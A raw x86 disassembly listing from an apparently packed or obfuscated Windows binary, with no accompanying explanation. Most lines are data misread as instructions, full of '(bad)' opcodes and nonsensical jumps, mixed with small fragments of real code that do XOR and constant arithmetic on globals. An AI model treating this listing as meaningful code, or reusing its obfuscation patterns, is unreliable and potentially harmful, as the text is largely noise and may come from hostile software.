  40ce33:	and    eax,DWORD PTR [ebp+0xac720ea]
  40ce39:	cmp    eax,0x34d27467
  40ce3e:	in     eax,0x99
  40ce40:	jne    0x40ce45
  40ce42:	repnz pop edi
  40ce44:	xchg   ebp,ecx
  40ce46:	jg     0x40cdec
  40ce48:	shl    BYTE PTR [ebx],1
  40ce4a:	jle    0x40cdd7
  40ce4c:	mov    edi,0x57bf9dfb
  40ce51:	pop    es
  40ce52:	mov    ecx,0x8c629475
  40ce57:	dec    eax
  40ce58:	pop    ecx
  40ce59:	inc    edx
  40ce5a:	mov    edx,cs
  40ce5c:	mov    eax,ds:0x7f78e6d2
  40ce61:	out    0x72,al
  40ce63:	dec    edx
  40ce64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce65:	xor    al,0x66
  40ce67:	and    eax,0xe5f0e832
  40ce6c:	hlt    
  40ce6d:	push   eax
  40ce6e:	repz div DWORD PTR [edx]
  40ce71:	dec    eax
  40ce72:	mov    esi,0x413fe344
  40ce77:	loope  0x40ce7d
  40ce79:	dec    esi
  40ce7a:	adc    ah,ah
  40ce7c:	ja     0x40cea8
  40ce7e:	leave  
  40ce7f:	mov    ds:0x65b769d3,eax
  40ce84:	sub    ecx,DWORD PTR [edi-0x59]
  40ce87:	mov    dh,BYTE PTR [ebx+0x18]
  40ce8a:	neg    BYTE PTR [eax-0x6e9ddef8]
  40ce90:	call   0x99b12057
  40ce95:	push   0x53
  40ce97:	cdq    
  40ce98:	pop    ebx
  40ce99:	adc    BYTE PTR ds:0xeee92e45,bh
  40ce9f:	ds pusha 
  40cea1:	addr16 dec ebx
  40cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea4:	add    al,0x6f
  40cea6:	mov    BYTE PTR [edx-0x53],cl
  40cea9:	push   0x39bf8746
  40ceae:	stos   BYTE PTR es:[edi],al
  40ceaf:	jle    0x40ced4
  40ceb1:	shl    BYTE PTR [esi],cl
  40ceb3:	cld    
  40ceb4:	jl     0x40ced5
  40ceb6:	sbb    bh,al
  40ceb8:	imul   ebp,DWORD PTR [edx],0xfffffff8
  40cebb:	pop    ecx
  40cebc:	add    eax,0x6967702e
  40cec1:	xchg   edi,eax
  40cec2:	imul   eax,esp,0xffffff84
  40cec5:	xchg   esp,eax
  40cec6:	jge    0x40cebe
  40cec8:	push   ebx
  40cec9:	outs   dx,BYTE PTR ds:[esi]
  40ceca:	push   0x3a
  40cecc:	clc    
  40cecd:	jecxz  0x40ce63
  40cecf:	dec    edi
  40ced0:	shl    BYTE PTR ds:[esi-0x642bda59],0xbe
  40ced8:	jnp    0x40ceec
  40ceda:	xchg   esi,eax
  40cedb:	push   edx
  40cedc:	test   eax,0xf94e015c
  40cee1:	fsubr  QWORD PTR [ebx]
  40cee3:	fwait
  40cee4:	adc    ecx,DWORD PTR [edx+0x39]
  40cee7:	jmp    0xf6dd:0x40554131
  40ceee:	cmp    eax,0x1be483a
  40cef3:	jg     0x40cf03
  40cef5:	or     al,0x91
  40cef7:	or     al,0xbf
  40cef9:	cdq    
  40cefa:	stc    
  40cefb:	sub    edi,edx
  40cefd:	outs   dx,DWORD PTR ds:[esi]
  40cefe:	add    ah,bl
  40cf00:	add    BYTE PTR [ebp-0x1752edb5],bl
  40cf06:	iret   
  40cf07:	jo     0x40ceeb
  40cf09:	repnz add edx,DWORD PTR [ebx-0x74]
  40cf0d:	xor    al,bl
  40cf0f:	call   0xb325a20e
  40cf14:	push   ebx
  40cf15:	neg    DWORD PTR [edx-0x1a]
  40cf18:	or     eax,0xb3b50410
  40cf1d:	sbb    BYTE PTR [eax+0x37],bh
  40cf20:	xchg   esi,eax
  40cf21:	fwait
  40cf22:	add    dl,BYTE PTR [edx-0x56]
  40cf25:	(bad)  
  40cf26:	int    0x97
  40cf28:	sub    eax,edi
  40cf2a:	sahf   
  40cf2b:	cwde   
  40cf2c:	pop    edi
  40cf2d:	ficom  DWORD PTR [eax]
  40cf2f:	loope  0x40cfae
  40cf31:	dec    edi
  40cf32:	ins    DWORD PTR es:[edi],dx
  40cf33:	push   edx
  40cf34:	adc    eax,0x2a5932d3
  40cf39:	dec    edx
  40cf3a:	(bad)  
  40cf3b:	ficomp DWORD PTR [ecx-0x59]
  40cf3e:	sub    eax,0x187639ec
  40cf43:	xchg   esi,eax
  40cf44:	in     al,0x85
  40cf46:	xchg   ecx,eax
  40cf47:	daa    
  40cf48:	or     BYTE PTR [edx-0x19],dl
  40cf4b:	jl     0x40cf79
  40cf4d:	push   ss
  40cf4e:	shr    DWORD PTR [eax+0x325c56e0],0x92
  40cf55:	pop    es
  40cf56:	jmp    0xfe05690e
  40cf5b:	hlt    
  40cf5c:	test   al,0x6d
  40cf5e:	fcmovb st,st(4)
  40cf60:	iret   
  40cf61:	mov    al,0x6d
  40cf63:	lahf   
  40cf64:	nop
  40cf65:	sbb    DWORD PTR ds:0x784f6faf,esi
  40cf6b:	mov    bl,0xaf
  40cf6d:	out    dx,al
  40cf6e:	mov    dh,0xf
  40cf70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf71:	mov    eax,ds:0xcc06019
  40cf76:	and    eax,0x54be7c94
  40cf7b:	int3   
  40cf7c:	jmp    FWORD PTR [ebx-0x128cc214]
  40cf82:	dec    ebx
  40cf83:	test   DWORD PTR [esp+edx*4],edx
  40cf86:	push   ebx
  40cf87:	mov    ds:0xf6749cb,al
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	push   edx
  40cfcb:	xchg   esp,eax
  40cfcc:	sub    esp,ebx
  40cfce:	sub    ah,BYTE PTR [edi+0x7e357878]
  40cfd4:	js     0x40d04e
  40cfd6:	loop   0x40cfcf
  40cfd8:	push   esp
  40cfd9:	aam    0x2d
  40cfdb:	std    
  40cfdc:	mov    dh,0x6f
  40cfde:	sub    BYTE PTR [edx],bl
  40cfe0:	dec    ebx
  40cfe1:	sub    ecx,ebx
  40cfe3:	adc    al,0x39
  40cfe5:	add    bl,BYTE PTR [ebx]
  40cfe7:	out    dx,eax
  40cfe8:	sbb    BYTE PTR [edx],bl
  40cfea:	imul   esi,DWORD PTR [ebp-0x5d],0x5c43cf2a
  40cff1:	cmp    dh,BYTE PTR [esi-0x37]
  40cff4:	jnp    0x40cfd3
  40cff6:	test   BYTE PTR [edi-0x73470d0],0x57
  40cffd:	or     eax,0xe0edb76c
  40d002:	inc    ecx
  40d003:	push   edx
  40d004:	lds    edx,FWORD PTR [ebp-0x74]
  40d007:	cdq    
  40d008:	and    ebp,ecx
  40d00a:	ins    DWORD PTR es:[edi],dx
  40d00b:	xor    DWORD PTR [edi-0x56],ebp
  40d00e:	xor    al,0x6b
  40d010:	mov    bl,0xaf
  40d012:	lds    ecx,FWORD PTR [ebx+0x56dbcbee]
  40d018:	and    ebx,ecx
  40d01a:	ja     0x40d013
  40d01c:	data16 and BYTE PTR [eax-0x6f],cl
  40d020:	gs ins DWORD PTR es:[edi],dx
  40d022:	cmc    
  40d023:	xchg   ebx,eax
  40d024:	dec    eax
  40d025:	sub    DWORD PTR [ebx+0x4d874dc7],eax
  40d02b:	pushf  
  40d02c:	inc    edi
  40d02d:	dec    ebx
  40d02e:	ret    
  40d02f:	retf   0x2af
  40d032:	rcr    BYTE PTR [edx],1
  40d034:	neg    DWORD PTR [esi+0x43d4f99f]
  40d03a:	or     ecx,DWORD PTR [esp+eax*8]
  40d03d:	jb     0x40d046
  40d03f:	dec    esp
  40d040:	pop    edi
  40d041:	sti    
  40d042:	sbb    ebp,edi
  40d044:	clc    
  40d045:	adc    BYTE PTR [esi+0x359c50f3],0x5c
  40d04c:	in     al,0x50
  40d04e:	and    al,0xf6
  40d050:	mov    ebx,edx
  40d052:	test   DWORD PTR [ecx],ecx
  40d054:	aaa    
  40d055:	add    al,cl
  40d057:	sub    cl,dh
  40d059:	mov    ds:0xecab24dc,eax
  40d05e:	dec    ebp
  40d05f:	or     DWORD PTR [esi],esp
  40d061:	xor    ecx,esp
  40d063:	xchg   esp,eax
  40d064:	cmp    DWORD PTR [ebx],eax
  40d066:	stos   DWORD PTR es:[edi],eax
  40d067:	pushf  
  40d068:	lods   al,BYTE PTR ds:[esi]
  40d069:	mov    ebp,0x7ce354fe
  40d06e:	xchg   ebx,eax
  40d06f:	adc    al,bh
  40d071:	test   al,0xf7
  40d073:	rol    al,0x97
  40d076:	leave  
  40d077:	add    eax,0xa8a8ca21
  40d07c:	shl    BYTE PTR [esi+0x57],1
  40d07f:	pop    edx
  40d080:	leave  
  40d081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d082:	lods   eax,DWORD PTR ds:[esi]
  40d083:	ret    
  40d084:	mov    esi,0x7fb264b8
  40d089:	clc    
  40d08a:	lock mov es,ebx
  40d08d:	xchg   edx,eax
  40d08e:	add    eax,0x2aa62163
  40d093:	pop    esi
  40d094:	lahf   
  40d095:	in     al,0x4b
  40d097:	test   DWORD PTR [ebx-0x5be12523],0x7d5ae15a
  40d0a1:	pop    ss
  40d0a2:	push   edi
  40d0a3:	fisttp QWORD PTR [eax+0x6bffdf6f]
  40d0a9:	and    DWORD PTR [ecx+0x3c],edx
  40d0ac:	outs   dx,DWORD PTR ds:[esi]
  40d0ad:	adc    DWORD PTR [ebx-0x4c369cb8],eax
  40d0b3:	adc    eax,0x90e126c1
  40d0b8:	cwde   
  40d0b9:	cwde   
  40d0ba:	aad    0x4d
  40d0bc:	push   ebp
  40d0bd:	jp     0x40d0dc
  40d0bf:	push   edi
  40d0c0:	inc    ebp
  40d0c1:	test   al,0x32
  40d0c3:	test   DWORD PTR [ecx],esp
  40d0c5:	sahf   
  40d0c6:	cs pop ebx
  40d0c8:	dec    ebx
  40d0c9:	push   eax
  40d0ca:	add    eax,0x23ad5f0e
  40d0cf:	imul   BYTE PTR [eax-0x3b]
  40d0d2:	sbb    ecx,ebx
  40d0d4:	scas   al,BYTE PTR es:[edi]
  40d0d5:	mul    BYTE PTR [edx-0x5879a0c1]
  40d0db:	retf   
  40d0dc:	mov    dl,0x4d
  40d0de:	add    DWORD PTR [edx],ebx
  40d0e0:	fdiv   st,st(1)
  40d0e2:	sub    eax,0xbfe81834
  40d0e7:	inc    esi
  40d0e8:	out    0xa3,eax
  40d0ea:	mov    ecx,0xc184c1e2
  40d0ef:	aas    
  40d0f0:	out    0x7f,eax
  40d0f2:	fs ror edi,cl
  40d0f5:	ret    
  40d0f6:	fidivr DWORD PTR [edx+0x4d4e634]
  40d0fc:	and    edi,DWORD PTR [edx-0x2e2fa1ec]
  40d102:	pop    ecx
  40d103:	push   es
  40d104:	mov    eax,0x2ca84363
  40d109:	sbb    al,0xa0
  40d10b:	sbb    al,0xa0
  40d10d:	push   ebp
  40d10e:	mov    cl,0xde
  40d110:	scas   eax,DWORD PTR es:[edi]
  40d111:	inc    ebx
  40d112:	cwde   
  40d113:	shr    DWORD PTR [ecx+0x36e1a200],0x7
  40d11a:	mov    edx,0x2b4f8012
  40d11f:	cmp    DWORD PTR [esi+0x4435ec81],0x39
  40d126:	leave  
  40d127:	dec    eax
  40d128:	gs mov cl,0x81
  40d12b:	push   0x5d
  40d12d:	pop    ecx
  40d12e:	sbb    eax,DWORD PTR [eax+0x5f1d0fec]
  40d134:	jbe    0x40d120
  40d136:	inc    eax
  40d137:	sbb    bl,bl
  40d139:	dec    esp
  40d13a:	mov    ch,0x17
  40d13c:	mov    ds:0xaa69114f,al
  40d141:	adc    DWORD PTR [esp+ebp*2-0x3549fbb6],edx
  40d148:	loopne 0x40d0e2
  40d14a:	jp     0x40d18d
  40d14c:	out    0x7d,eax
  40d14e:	(bad)  
  40d14f:	outs   dx,DWORD PTR ss:[esi]
  40d151:	add    bh,0x16
  40d154:	iret   
  40d155:	stos   BYTE PTR es:[edi],al
  40d156:	ja     0x40d153
  40d158:	add    al,0xfc
  40d15a:	sub    BYTE PTR [ecx+0x64cf6940],ch
  40d160:	fisubr WORD PTR [eax]
  40d162:	ja     0x40d1c5
  40d164:	(bad)  
  40d165:	sar    DWORD PTR [esp+ebp*2-0x6aa1697a],cl
  40d16c:	jno    0x40d19c
  40d16e:	xchg   ebx,eax
  40d16f:	popf   
  40d170:	rol    DWORD PTR [edx+0x675b5a73],cl
  40d176:	int    0xd8
  40d178:	push   cs
  40d179:	cwde   
  40d17a:	sub    edx,DWORD PTR [ebp+0x130b25d1]
  40d180:	pop    ecx
  40d181:	jmp    0x89b5bccb
  40d186:	inc    edx
  40d187:	pop    ebp
  40d188:	push   0x4c
  40d18a:	pop    edx
  40d18b:	addr16 test al,0xbb
  40d18e:	cmp    eax,0x9d8c8308
  40d193:	or     al,0xf8
  40d195:	in     al,dx
  40d196:	shr    BYTE PTR [ecx+0x36],0x35
  40d19a:	xor    dl,0xca
  40d19d:	call   0xbb4b:0xf122a58e
  40d1a4:	mov    DWORD PTR [ebx-0x68],ebp
  40d1a7:	out    dx,eax
  40d1a8:	(bad)  
  40d1a9:	cmc    
  40d1aa:	jno    0x40d1d6
  40d1ac:	push   0x2afb8f9b
  40d1b1:	xlat   BYTE PTR ds:[ebx]
  40d1b2:	push   eax
  40d1b3:	lds    ecx,FWORD PTR [esi]
  40d1b5:	inc    ebp
  40d1b6:	fwait
  40d1b7:	or     eax,0x435b8597
  40d1bd:	sub    eax,0x1c27fe4
  40d1c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1c3:	dec    ebp
  40d1c4:	frstor [ebp+0x19]
  40d1c7:	popf   
  40d1c8:	mov    al,ds:0xe6260edc
  40d1cd:	xor    ebx,ecx
  40d1cf:	fs inc eax
  40d1d1:	popf   
  40d1d2:	add    dl,BYTE PTR [eax]
  40d1d4:	imul   ecx,DWORD PTR [ebp+eax*4-0x5a],0x9f3ac9e8
  40d1dc:	fstp   st(1)
  40d1de:	cmp    al,0xbf
  40d1e0:	jbe    0x40d167
  40d1e2:	ret    
  40d1e3:	jb     0x40d205
  40d1e5:	adc    BYTE PTR [ebx+0x5e9e23a3],ch
  40d1eb:	addr16 cli 
  40d1ed:	idiv   BYTE PTR [eax-0x100b3b9b]
  40d1f3:	aaa    
  40d1f4:	sti    
  40d1f5:	mov    al,0x1b
  40d1f7:	aam    0xff
  40d1f9:	jg     0x40d1fd
  40d1fb:	ja     0x40d1c6
  40d1fd:	sub    esi,DWORD PTR [edi]
  40d1ff:	rcr    dl,0x93
  40d202:	and    BYTE PTR [ebx],ch
  40d204:	sub    esi,ebp
  40d206:	inc    ecx
  40d207:	(bad)  ds:0xa4a884ab
  40d20d:	das    
  40d20e:	int3   
  40d20f:	lldt   WORD PTR [ebx+0x56]
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	in     eax,dx
  40d2ba:	jnp    0x40d26b
  40d2bc:	or     al,0xe7
  40d2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x5878787e
  40d2c6:	inc    esp
  40d2c7:	and    edi,DWORD PTR [ecx]
  40d2c9:	cdq    
  40d2ca:	lds    edx,FWORD PTR [edi+ebp*2]
  40d2cd:	pusha  
  40d2ce:	popf   
  40d2cf:	lea    esp,[esi]
  40d2d1:	xchg   esi,eax
  40d2d2:	leave  
  40d2d3:	mov    al,0x69
  40d2d5:	sbb    eax,esp
  40d2d7:	dec    ecx
  40d2d8:	es das 
  40d2da:	mov    edi,0x153eb5ab
  40d2df:	xor    esp,DWORD PTR [eax]
  40d2e1:	(bad)  
  40d2e2:	push   ebp
  40d2e3:	adc    eax,0x9c6d48b1
  40d2e8:	das    
  40d2e9:	dec    ebp
  40d2ea:	adc    eax,DWORD PTR [ebx-0x7a]
  40d2ed:	rcl    BYTE PTR [esi],cl
  40d2ef:	mov    ch,0xa3
  40d2f1:	or     al,0x5d
  40d2f3:	mov    bl,0xc
  40d2f5:	jge    0x40d308
  40d2f7:	scas   al,BYTE PTR es:[edi]
  40d2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f9:	lods   al,BYTE PTR ds:[esi]
  40d2fa:	sbb    DWORD PTR [edi+0x39],0xffffffd0
  40d2fe:	test   BYTE PTR [edi],ch
  40d300:	mov    ah,0x9c
  40d302:	xchg   edx,eax
  40d303:	add    BYTE PTR [ecx+0x31],al
  40d306:	dec    esi
  40d307:	or     BYTE PTR [esi+0xa04e3a1],dl
  40d30d:	stos   DWORD PTR es:[edi],eax
  40d30e:	sbb    eax,0x57b07ccb
  40d313:	pop    es
  40d314:	lock jns 0x40d2d3
  40d317:	pop    es
  40d318:	fwait
  40d319:	(bad)  
  40d31a:	push   edi
  40d31b:	cmp    eax,0xe56f4e50
  40d320:	ins    BYTE PTR es:[edi],dx
  40d321:	push   ebx
  40d322:	lds    eax,FWORD PTR ds:0x8b471825
  40d328:	and    DWORD PTR [ecx-0x5f9fa903],0xffffffdf
  40d32f:	inc    ebp
  40d330:	rcl    BYTE PTR [edx+0x4c],1
  40d333:	jl     0x40d30c
  40d335:	cld    
  40d336:	pop    ss
  40d337:	add    al,0xa5
  40d339:	call   0x9d135809
  40d33e:	mov    edi,0xf027eb96
  40d343:	pop    ss
  40d344:	sbb    ah,BYTE PTR [ebx+0x4d]
  40d347:	les    eax,FWORD PTR [eax+0x3f]
  40d34a:	hlt    
  40d34b:	xor    DWORD PTR [edx+0x1ed0d78b],edx
  40d351:	jge    0x40d38f
  40d353:	in     eax,0x66
  40d355:	(bad)  
  40d356:	lea    eax,[eax-0x74d62aed]
  40d35c:	fidivr WORD PTR [eax+0x386a8723]
  40d362:	push   esp
  40d363:	cdq    
  40d364:	xchg   edi,eax
  40d365:	dec    edx
  40d366:	mov    bl,0xb3
  40d368:	dec    esp
  40d369:	mov    ah,0xcb
  40d36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d36c:	(bad)  
  40d36d:	mov    al,BYTE PTR [edx]
  40d36f:	cmp    ebp,ebp
  40d371:	cdq    
  40d372:	lods   al,BYTE PTR ds:[esi]
  40d373:	mov    ah,0xcc
  40d375:	pop    eax
  40d376:	inc    ebx
  40d377:	inc    esp
  40d378:	and    esp,DWORD PTR [esi+0x3e]
  40d37b:	(bad)  
  40d37e:	sbb    al,0x1c
  40d380:	pusha  
  40d381:	nop
  40d382:	ins    DWORD PTR es:[edi],dx
  40d383:	jo     0x40d315
  40d385:	inc    ecx
  40d386:	push   edi
  40d387:	lahf   
  40d388:	sbb    BYTE PTR [ebx-0x147b5a4f],dl
  40d38e:	fild   WORD PTR [ecx+0x33]
  40d391:	rcr    DWORD PTR [eax],1
  40d393:	dec    edi
  40d394:	in     al,0x3c
  40d396:	int    0xcc
  40d398:	xchg   esi,eax
  40d399:	(bad)  
  40d39a:	aas    
  40d39b:	jne    0x40d40b
  40d39d:	adc    BYTE PTR ss:[ecx-0x2aa6796f],0xaa
  40d3a5:	inc    ecx
  40d3a6:	sub    BYTE PTR [ebp-0x6e],0x70
  40d3aa:	mov    ebx,0xde2cf81
  40d3af:	(bad)  [eax-0x75]
  40d3b2:	icebp  
  40d3b3:	dec    esp
  40d3b4:	mov    ah,0x9f
  40d3b6:	inc    ebp
  40d3b7:	stos   DWORD PTR es:[edi],eax
  40d3b8:	je     0x40d3ba
  40d3ba:	lods   eax,DWORD PTR ds:[esi]
  40d3bb:	popf   
  40d3bc:	stc    
  40d3bd:	xchg   edi,edi
  40d3bf:	xchg   ebx,eax
  40d3c0:	(bad)  
  40d3c1:	mov    DWORD PTR [ebp+0x35],edi
  40d3c4:	push   esi
  40d3c6:	shr    ebx,1
  40d3c8:	fmul   QWORD PTR [edx-0x7c]
  40d3cb:	je     0x40d359
  40d3cd:	inc    esi
  40d3ce:	mov    al,ds:0xb0aef0e6
  40d3d3:	push   ebx
  40d3d4:	xchg   DWORD PTR [ebx],esp
  40d3d6:	hlt    
  40d3d7:	pop    ebp
  40d3d8:	sub    eax,0xd1293bfc
  40d3dd:	mov    bl,0x50
  40d3df:	mov    cl,0x90
  40d3e1:	inc    esi
  40d3e2:	int    0xe6
  40d3e4:	jae    0x40d3fc
  40d3e6:	cmp    eax,0xebdcff95
  40d3eb:	ror    DWORD PTR ss:[esi-0x2cdcf81e],cl
  40d3f2:	shr    edx,0xa6
  40d3f5:	xor    eax,0xe3313e75
  40d3fa:	xor    BYTE PTR ds:0xc81fa0bb,dh
  40d400:	dec    edx
  40d401:	shr    BYTE PTR [ecx],0x56
  40d404:	push   eax
  40d405:	inc    edi
  40d406:	ficom  WORD PTR [eax+eiz*2-0x2a]
  40d40a:	fmul   DWORD PTR [ebp+0x37f8bb87]
  40d410:	sub    bl,BYTE PTR [esi-0x1d5d9ca0]
  40d416:	add    BYTE PTR [ecx+eiz*2+0x2ef3acb1],0x9e
  40d41e:	aad    0xe4
  40d420:	push   eax
  40d421:	mov    dl,0x46
  40d423:	and    al,0x77
  40d425:	adc    cl,BYTE PTR ds:0xa24005d1
  40d42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d42c:	xor    al,0x9d
  40d42e:	lods   eax,DWORD PTR ds:[esi]
  40d42f:	fdivr  DWORD PTR [eax-0x74]
  40d432:	dec    esp
  40d433:	xchg   DWORD PTR [esi+0x58],ebp
  40d436:	or     eax,0x9f56ca0a
  40d43b:	jmp    0x426b0dbb
  40d440:	pop    esi
  40d441:	inc    eax
  40d442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d443:	xchg   ebx,eax
  40d444:	out    0x24,eax
  40d446:	jae    0x40d405
  40d448:	or     al,0x64
  40d44a:	hlt    
  40d44b:	inc    esi
  40d44c:	sbb    DWORD PTR [edx-0x4],esi
  40d44f:	shl    ch,1
  40d451:	mov    DWORD PTR [edi],ecx
  40d453:	xchg   edi,eax
  40d454:	sub    al,0xd5
  40d456:	adc    eax,0x326e955
  40d45b:	inc    edx
  40d45c:	mov    al,BYTE PTR [ecx-0x25]
  40d45f:	mov    edi,cr5
  40d462:	xlat   BYTE PTR ds:[ebx]
  40d463:	mov    esi,0x27de1667
  40d468:	stc    
  40d469:	mov    cl,0xaa
  40d46b:	ins    BYTE PTR es:[edi],dx
  40d46c:	aaa    
  40d46d:	fcomi  st,st(7)
  40d46f:	lods   al,BYTE PTR ds:[esi]
  40d470:	ret    
  40d471:	scas   al,BYTE PTR es:[edi]
  40d472:	mov    DWORD PTR [edi-0x76],esi
  40d475:	outs   dx,DWORD PTR ds:[esi]
  40d476:	jae    0x40d410
  40d478:	fldln2 
  40d47a:	sub    ah,0xc9
  40d47d:	enter  0xb72d,0x1b
  40d481:	dec    esp
  40d482:	push   ecx
  40d483:	lods   al,BYTE PTR ds:[esi]
  40d484:	test   DWORD PTR [ebx+0x46],esi
  40d487:	add    DWORD PTR [ecx+edx*4+0x172fadfb],0x23bd0740
  40d492:	js     0x40d4c4
  40d494:	(bad)  
  40d495:	icebp  
  40d496:	icebp  
  40d497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d498:	xchg   esi,eax
  40d499:	cmp    edx,DWORD PTR [eax+0x3b]
  40d49c:	pushf  
  40d49d:	inc    esp
  40d49e:	pusha  
  40d49f:	nop
  40d4a0:	cwde   
  40d4a1:	sbb    al,0x44
  40d4a3:	xchg   BYTE PTR [edx+ebp*1-0x5b3f4151],dl
  40d4aa:	add    BYTE PTR [ecx-0x2ad2c77c],ch
  40d4b0:	mov    cl,0xe4
  40d4b2:	and    ah,dh
  40d4b4:	push   eax
  40d4b5:	and    al,BYTE PTR [ebx-0x6d7f3358]
  40d4bb:	sbb    BYTE PTR [ebx-0x72f7959d],0xd6
  40d4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4c3:	jmp    0xf0771ea4
  40d4c8:	push   ecx
  40d4c9:	or     DWORD PTR [eax+edx*4-0x58576201],esp
  40d4d0:	mov    al,ds:0xbe295f73
  40d4d5:	mov    bh,0x59
  40d4d7:	out    0xf8,eax
  40d4d9:	sbb    eax,0xf932713d
  40d4de:	hlt    
  40d4df:	or     DWORD PTR [edi],ebx
  40d4e1:	xchg   ecx,eax
  40d4e2:	test   BYTE PTR [edx],bl
  40d4e4:	icebp  
  40d4e5:	or     eax,0x40ba1ed6
  40d4ea:	nop
  40d4eb:	sub    BYTE PTR [ebx-0x4cdf7459],cl
  40d4f1:	sub    DWORD PTR [eax],edx
  40d4f3:	ret    
  40d4f4:	out    0x86,al
  40d4f6:	ins    DWORD PTR es:[edi],dx
  40d4f7:	adc    ch,BYTE PTR [esi+0x13]
  40d4fa:	fwait
  40d4fb:	xlat   BYTE PTR ds:[ebx]
  40d4fc:	clc    
  40d4fd:	stc    
  40d4fe:	fs (bad) 
  40d500:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  40d507:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  40d50e:	and    DWORD PTR ds:0x42a7f5,0x42a805
  40d518:	add    edi,ebx
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	pop    esp
  40d576:	je     0x40d594
  40d578:	in     eax,0x9c
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0xd678787e
  40d582:	mov    ds,WORD PTR [esi-0x3a291d5a]
  40d588:	xor    ebx,DWORD PTR ds:0x75dfb1fb
  40d58e:	pop    ds
  40d58f:	out    0xe0,al
  40d591:	inc    edx
  40d592:	and    BYTE PTR [eax+0x4ab2f4f9],bl
  40d598:	icebp  
  40d599:	push   eax
  40d59a:	add    DWORD PTR [esi-0x3],0xd4eca45c
  40d5a1:	push   cs
  40d5a2:	inc    ebp
  40d5a3:	cmc    
  40d5a4:	mov    al,ds:0x1328a544
  40d5a9:	sbb    DWORD PTR es:[edx+0x73580181],0xffffffd9
  40d5b1:	dec    ebp
  40d5b2:	nop
  40d5b3:	shr    DWORD PTR [edi-0x5b],0x45
  40d5b7:	cmp    DWORD PTR [esp+ecx*2+0x7e],0x1f
  40d5bc:	loope  0x40d556
  40d5be:	mov    ch,0xc2
  40d5c0:	sti    
  40d5c1:	cmp    BYTE PTR [eax+edi*8],0xa0
  40d5c5:	int    0x62
  40d5c7:	lds    esp,FWORD PTR [ecx+0x2a]
  40d5ca:	xchg   ebx,eax
  40d5cc:	ret    
  40d5cd:	popa   
  40d5ce:	sbb    ecx,DWORD PTR [ecx]
  40d5d0:	push   edi
  40d5d1:	or     ah,dh
  40d5d3:	mov    ebx,0x29a865f5
  40d5d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5d9:	ins    BYTE PTR es:[edi],dx
  40d5da:	(bad)  
  40d5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5dc:	fild   WORD PTR [ebp+ebx*4+0x41]
  40d5e0:	mov    dh,0x4e
  40d5e2:	lock sahf 
